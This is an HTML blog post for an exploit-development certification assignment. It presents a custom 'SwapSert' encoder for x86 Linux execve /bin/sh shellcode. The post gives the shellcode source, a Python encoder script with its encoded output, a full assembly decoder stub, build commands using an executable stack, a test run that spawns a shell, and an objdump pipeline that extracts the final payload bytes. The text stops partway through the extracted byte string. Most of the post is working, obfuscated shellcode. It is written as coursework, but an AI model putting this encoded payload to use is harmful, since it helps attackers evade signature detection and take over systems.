I"P¬<h3 id="the-blog-post-has-been-created-for-completing-the-requirements-of-the-securitytube-linux-assembly-expert-certification">The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</h3>
<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><br />
Student ID: SLAE-990</p>

<p>Assignment #4</p>

<hr />

<h2 id="goals">Goals</h2>
<ul>
  <li>Take a simple shellcode that uses execve to spawn /bin/sh and run it through a custom encoder</li>
  <li>Explain the custom encoder and show it executing</li>
</ul>

<h2 id="what-is-an-encoder">What is an encoder?</h2>
<p>An encoder can be defined as an implementation of transforming data from one format to another using a publicly known scheme that can be reversed.  That is, it is not a form of encryption but rather a way to compress or change the form of data.  In this case, known shellcode will be mangled by both shifting bytes around and inserting bytes.  Upon decoding the reverse will happen which will allow the shellcode to run again.</p>

<h2 id="the-shellcode-to-encode">The shellcode to encode</h2>
<p>The following shellcode will spawn /bin/sh when executed. This will be the basis of what we will encode with the custom encoder.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td> --><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>			

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>

	<span class="c1">; PUSH the first null dword</span>
	<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
	<span class="nf">push</span> <span class="nb">eax</span>

	<span class="c1">; PUSH //bin/sh (8 bytes)</span>
	<span class="nf">push</span> <span class="mh">0x68732f2f</span>
	<span class="nf">push</span> <span class="mh">0x6e69622f</span>
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
	<span class="nf">push</span> <span class="nb">eax</span>
	<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
	<span class="nf">push</span> <span class="nb">ebx</span>
	<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
	<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
	<span class="nf">int</span> <span class="mh">0x80</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="the-custom-encoder">The custom encoder</h2>
<p><strong>SwapSert Encoder</strong>
The idea of this encoder is that it will swap two adjacent bytes and then insert a byte.  The inserted byte in this example will be 0x7f.</p>

<h3 id="encoding-phase">Encoding phase</h3>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Step</th>
      <th style="text-align: left">Sequence</th>
      <th style="text-align: left">What is happening?</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">1</td>
      <td style="text-align: left">\x41 \x42 \x43 \x44</td>
      <td style="text-align: left">starting bytes</td>
    </tr>
    <tr>
      <td style="text-align: left">2</td>
      <td style="text-align: left">\x42 \x41 \x7f \x43 \x44</td>
      <td style="text-align: left">swap 1st/2nd bytes and insert byte</td>
    </tr>
    <tr>
      <td style="text-align: left">3</td>
      <td style="text-align: left">\x42 \x41 \x7f \x44 \x43 \x7f</td>
      <td style="text-align: left">swap 3rd/4th bytes and insert byte</td>
    </tr>
  </tbody>
</table>

<h4 id="example-of-this-being-done-on-the-first-8-bytes-of-our-shellcode">Example of this being done on the first 8 bytes of our shellcode</h4>
<p><img src="http://localhost:4000/assets/img/slae32/04-01.png" /></p>

<p><strong>Python script to encode a byte array</strong></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td> --><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="s">b"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f</span><span class="s">"</span> \
            <span class="s">b"</span><span class="se">\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89</span><span class="s">"</span> \
            <span class="s">b"</span><span class="se">\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span>
<span class="n">encoded</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">encoded2</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">print</span><span class="p">(</span><span class="s">'Encoded shellcode ...'</span><span class="p">)</span>

<span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">insert_byte</span> <span class="o">=</span> <span class="s">b"</span><span class="se">\x7f</span><span class="s">"</span>
<span class="k">while</span> <span class="p">(</span><span class="n">pos</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="n">encoded</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x"</span>
		<span class="o">%</span> <span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">encoded2</span> <span class="o">+=</span> <span class="s">"0x%02x,0x%02x,0x%02x,"</span>
		<span class="o">%</span> <span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">pos</span> <span class="o">+=</span> <span class="mi">2</span>

<span class="k">if</span> <span class="ow">not</span> <span class="n">pos</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="n">encoded</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x"</span>
		<span class="o">%</span> <span class="p">(</span><span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">encoded2</span> <span class="o">+=</span> <span class="s">"0x%02x,0x%02x,0x%02x"</span>
		<span class="o">%</span> <span class="p">(</span><span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Original: </span><span class="se">\"</span><span class="s">"</span> <span class="o">+</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s">'</span><span class="se">\\</span><span class="s">x%02x'</span> <span class="o">%</span> <span class="n">x</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="s">"</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Format1: </span><span class="se">\"</span><span class="s">"</span> <span class="o">+</span> <span class="n">encoded</span> <span class="o">+</span> <span class="s">"</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Format2: "</span> <span class="o">+</span> <span class="n">encoded2</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="encoding-the-shellcode-with-the-python-script">Encoding the shellcode with the python script</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 assignment4]<span class="nv">$ </span>python3 swapsert-encoder.py
Encoded shellcode ...
Original: <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

Format1: <span class="s2">"</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">7f"</span>
Format2: 0xc0,0x31,0x7f,0x68,0x50,0x7f,0x2f,0x2f,0x7f,0x68,0x73,0x7f,0x2f,0x68,0x7f,0x69,0x62,0x7f,0x89,0x6e,0x7f,0x50,0xe3,0x7f,0xe2,0x89,0x7f,0x89,0x53,0x7f,0xb0,0xe1,0x7f,0xcd,0x0b,0x7f,0x7f,0x80,0x7f
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="decoding-phase">Decoding phase</h3>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Step</th>
      <th style="text-align: left">Sequence</th>
      <th style="text-align: left">What is happening?</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">1</td>
      <td style="text-align: left">\x42 \x41 \x7f \x44 \x 43 \x7f</td>
      <td style="text-align: left">starting encoded bytes</td>
    </tr>
    <tr>
      <td style="text-align: left">2</td>
      <td style="text-align: left">\x41 \x42 \x44 \x43 \x7f</td>
      <td style="text-align: left">swap 1st&amp;2nd bytes and remove byte</td>
    </tr>
    <tr>
      <td style="text-align: left">3</td>
      <td style="text-align: left">\x41 \x42 \x43 \x44</td>
      <td style="text-align: left">swap 3rd/4th bytes and remove byte</td>
    </tr>
  </tbody>
</table>

<p>The decoder will acquire a reference to the location of the encoded bytes and perform the reverse actions to transform it back to executable shellcode.  To perform this task I started will a skeleton assembly file setup to perform a JMP/CALL/POP so I have the address of the encoded shellcode.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td> --><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>			

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>
	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">call_shellcode</span>

<span class="nl">decoder:</span>
	<span class="nf">pop</span> <span class="nb">esi</span>

<span class="nl">decode:</span>

	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">EncodedShellcode</span>

<span class="nl">call_shellcode:</span>
	<span class="nf">call</span> <span class="nv">decoder</span>
	<span class="nl">EncodedShellcode:</span> <span class="kd">db</span> <span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xe2</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xcd</span><span class="p">,</span><span class="mh">0x0b</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x7f</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The process of decoding requires a few things to be tracked: the current location of the last decoded byte, how far out the next set of bytes to grab is, and finally testing 3 bytes ahead for another \x7f byte.</p>

<p><i>NOTE: If by chance the shellcode is done and the next insert byte check happens to run into a \x7f that is not part of the shellcode it would continue to swap bytes. Low chance, but it could happen. That said, it would not stop the shell from spawning on us and would only matter if the shellcode was back-to-back with additional instructions we needed to execute after the shell was spawned.</i></p>

<h3 id="setting-up-registers-and-initial-values">Setting up registers and initial values</h3>
<p>The first part of our shellcode will save a pointer to the first byte of our encoded shellcode.  Since we are performing a JMP/CALL/POP weâ€™ll be able to POP the memory location of the array of bytes weâ€™ll be working with without having to know itâ€™s address beforehand.</p>

<p>EAX/EBX/ECX/EDX are all zeroed out as they will be used for swapping each pair of bytes and for tracking the offset where bytes are to be swapped into next.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre><span class="nl">decoder:</span>
	<span class="nf">pop</span> <span class="nb">esi</span>			<span class="c1">; save location of encoded shellcode</span>
	<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>		<span class="c1">; zero out ebx - used for swapping</span>
	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>		<span class="c1">; zero out ecx - insert byte tracking</span>
	<span class="nf">mul</span> <span class="nb">ecx</span>			<span class="c1">; zero out EAX/EDX - used for swapping</span>
	<span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span><span class="nb">esi</span>		<span class="c1">; save encoded shellcode location into edi</span>
	<span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span><span class="mi">2</span>		<span class="c1">; location of next expected insert byte</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="decode-loop">Decode loop</h3>
<p>Now we are in the decoding loop where weâ€™ll continue to swap bytes and overshift 0x7f bytes. Our first check will be to determine whether we have a 0x7f byte in the next predetermined location indicating we should perform another swap.  If we donâ€™t see it there weâ€™ll conclude that we are done swapping and we should exit the loop.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="nf">cmp</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="p">],</span> <span class="mh">0x7f</span>	<span class="c1">; should another swap occur?</span>
<span class="nf">jne</span> <span class="nv">done</span>					<span class="c1">; jump out of loop</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Next, we perform a swap.  We canâ€™t swap the bytes between memory locations so we save each byte to a register and then save the register value back to opposite memory locations for perform the swap.  ECX is tracking the location further ahead where the 0x7f byte is at and the two bytes to swap will always be the two bytes behind it.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre><span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>			<span class="c1">; save first byte in pair</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>			<span class="c1">; save second byte in pair</span>
<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span><span class="p">],</span> <span class="nb">bl</span>				<span class="c1">; swap byte</span>
<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="nb">al</span>				<span class="c1">; swap byte</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Finally, we adjust the offset of where the next 0x7f byte is expected and udpate the memory offset of where we would swap the bytes to.  We then jump to the beginning of the loop where we test for the existence of the expected 0x7f byte.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre><span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">3</span>				<span class="c1">; the next 0x7f byte should be 3 bytes ahead</span>
<span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="mi">2</span>				<span class="c1">; memory offset for next swap save</span>
<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">decode</span>			<span class="c1">; jump back to the beginning of the loop</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="completed-decoder-in-x86-assembly">Completed decoder in x86 assembly</h3>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td> --><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>			

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>
	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">call_shellcode</span>

<span class="nl">decoder:</span>
	<span class="nf">pop</span> <span class="nb">esi</span>				<span class="c1">; save location of encoded shellcode</span>
	<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>			<span class="c1">; zero out ebx - used for swapping</span>
	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>			<span class="c1">; zero out ecx - insert byte tracking</span>
	<span class="nf">mul</span> <span class="nb">ecx</span>				<span class="c1">; zero out EAX/EDX - used for swapping</span>
	<span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span><span class="nb">esi</span>			<span class="c1">; save encoded shellcode location into edi</span>
	<span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span><span class="mi">2</span>			<span class="c1">; location of next expected insert byte</span>

<span class="nl">decode:</span>
	<span class="nf">cmp</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="p">],</span> <span class="mh">0x7f</span>	<span class="c1">; should another swap occur?</span>
	<span class="nf">jne</span> <span class="nv">done</span>			<span class="c1">; jump out of loop</span>
	<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>		<span class="c1">; save first byte in pair</span>
	<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>		<span class="c1">; save second byte in pair</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span><span class="p">],</span> <span class="nb">bl</span>			<span class="c1">; swap byte</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="nb">al</span>			<span class="c1">; swap byte</span>
	<span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">3</span>			<span class="c1">; the next 0x7f byte should be 3 bytes ahead</span>
	<span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="mi">2</span>			<span class="c1">; memory offset for next swap save</span>
	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">decode</span>		<span class="c1">; jump back to the beginning of the loop</span>

<span class="nl">done:</span>
	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">EncodedShellcode</span>

<span class="nl">call_shellcode:</span>
	<span class="nf">call</span> <span class="nv">decoder</span>
	<span class="nl">EncodedShellcode:</span> <span class="kd">db</span> <span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xe2</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xcd</span><span class="p">,</span><span class="mh">0x0b</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x7f</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="compiling-testing-and-emmiting-shellcode-for-use">Compiling, testing, and emmiting shellcode for use</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>nasm <span class="nt">-f</span> elf32 ./swapsert-decoder.nasm <span class="nt">-o</span> swapsert-decoder.o
<span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>ld <span class="nt">-z</span> execstack <span class="nt">-N</span> ./swapsert-decoder.o <span class="nt">-o</span> swapsert-decoder
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Execute our assembly code to ensure we get our bash shell</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>./swapsert-decoder
sh-4.4<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can now extract the shellcode bytes for use in our test C program</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>objdump <span class="nt">-d</span> ./swapsert-decoder|grep <span class="s1">'[0-9a-f]:'</span>|grep <span class="nt">-v</span> <span class="s1">'file'</span>|cut <span class="nt">-f2</span> <span class="nt">-d</span>:|cut <span class="nt">-f1-6</span> <span class="nt">-d</span><span class="s1">' '</span>|tr <span class="nt">-s</span> <span class="s1">' '</span>|tr <span class="s1">'\t'</span> <span class="s1">' '</span>|sed <span class="s1">'s/ $//g'</span>|sed <span class="s1">'s/ /\\x/g'</span>|paste <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-s</span> |sed <span class="s1">'s/^/"/'</span>|sed <span class="s1">'s/$/"/g'</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span 